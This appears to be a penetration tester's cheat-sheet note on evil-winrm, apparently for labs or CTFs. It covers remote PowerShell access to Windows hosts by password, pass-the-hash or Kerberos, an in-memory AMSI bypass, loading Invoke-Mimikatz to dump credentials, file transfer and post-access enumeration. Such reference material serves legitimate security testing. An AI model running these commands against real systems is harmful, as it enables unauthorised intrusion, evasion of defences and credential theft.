---
tags: [pentest, evil-winrm, winrm, remote-shell, ad, active-directory, initial-access, windows]
tool: evil-winrm
phase: 5
---
# evil-winrm

The go-to WinRM client for offensive use. Interactive PS shell when you have valid creds + the target has WinRM enabled (5985/5986).

[[06 - Gaining Access/00 - README|Folder index]]

## Run

```bash
# Password auth
evil-winrm -i <target> -u user -p 'pass'

# PtH (hash auth)
evil-winrm -i <target> -u user -H <NTLM>

# Kerberos
evil-winrm -i <target> -u user -r corp.local

# HTTPS WinRM (port 5986)
evil-winrm -i <target> -u user -p pass -S       # -S = SSL
evil-winrm -i <target> -u user -p pass -S -c cert.crt -k key.pem

# Custom port
evil-winrm -i <target> -u user -p pass -P 5985
```

## Useful built-in commands

```text
menu                            # show extras
upload /attacker/file C:\path  # upload a file
download C:\Users\u\file.txt    # download a file
services                        # list services
Invoke-Binary /path/binary.exe   # in-memory execute binary
Bypass-4MSI                     # in-memory AMSI bypass
Donut-Loader path/binary.exe    # in-memory execute via Donut
load-ps1 /path/Invoke-Mimikatz.ps1
Invoke-Mimikatz                 # then call it
```

## Tips

- WinRM admin needs membership in **Administrators** OR **Remote Management Users**.
- WinRM logs auth events on the target (4624 / 4625).
- File upload puts files in `C:\Users\<user>\Documents\` by default - use `cd C:\Windows\Temp` first.
- `Bypass-4MSI` only works inside the same evil-winrm session - re-apply for each new session.

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `Failed to authenticate at...` | Wrong cred or domain. Try `--realm corp.local` or full `corp\user`. |
| `Error: An error of type [...] WSMan::WSManFault` | WinRM not listening / target offline. `nxc winrm <target>` to confirm. |
| `Unable to login. The Login is not allowed via WinRM` | User isn't in Administrators or Remote Management Users. Add them or use another protocol. |
| Hangs on connect | Port 5985 not reachable; check firewall. |

## Alternatives if WinRM is closed

- `nxc winrm` (functionally equivalent for command exec)
- `impacket-psexec` / `impacket-wmiexec` (SMB / DCOM)
- RDP if user has the right

> [!tip] Quickest enum after WinRM shell
> `whoami /priv ; whoami /groups ; gci C:\Users` - reveals privileges + which user's flag(s) you can reach.
